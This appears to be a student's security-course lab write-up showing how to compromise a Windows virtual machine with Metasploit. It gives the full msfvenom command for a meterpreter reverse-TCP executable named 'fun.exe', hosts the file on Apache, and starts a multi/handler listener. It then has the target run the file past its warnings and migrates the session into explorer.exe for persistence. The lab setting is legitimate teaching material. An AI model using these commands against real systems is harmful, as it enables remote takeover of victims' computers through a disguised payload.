
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig

<img width="1920" height="1080" alt="KALI 2  Running  - Oracle VirtualBox 25-10-2025 08_33_30" src="https://github.com/user-attachments/assets/4b3b93ef-60d9-4d1e-acae-75ef0d9dce86" />


## OUTPUT:



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

<img width="955" height="150" alt="Screenshot 2025-10-25 091100" src="https://github.com/user-attachments/assets/27cdc760-3991-4b14-af96-e62633b766cf" />


## OUTPUT:


copy the fun.exe into the apache /var/www/html folder

<img width="621" height="66" alt="Screenshot 2025-10-25 090956" src="https://github.com/user-attachments/assets/922e33bc-6837-4c31-98d5-8a072f04a495" />

## OUTPUT:


Start apache server
sudo systemctl apache2 start
<img width="578" height="71" alt="Screenshot 2025-10-25 091000" src="https://github.com/user-attachments/assets/ee1548d3-759b-4379-afa4-a1e5837cbfa7" />



## OUTPUT:

<img width="1920" height="1080" alt="KALI 2  Running  - Oracle VirtualBox 25-10-2025 08_55_00" src="https://github.com/user-attachments/assets/0cecf6a5-750c-46db-8d4b-a339bf04ecfe" />


Invoke msfconsole:

## OUTPUT:



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
<img width="901" height="144" alt="Screenshot 2025-10-25 091320" src="https://github.com/user-attachments/assets/0261e65b-2411-4059-8e21-3802963957d1" />

## OUTPUT:



<img width="801" height="545" alt="KALI 2  Running  - Oracle VirtualBox 25-10-2025 09_13_47" src="https://github.com/user-attachments/assets/2f3ac70c-57fc-44d0-aa2f-a58b7e7f758a" />

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="1374" height="706" alt="Screenshot 2025-10-25 090651" src="https://github.com/user-attachments/assets/6d101390-9014-47fc-b0ab-db697eb56b1b" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
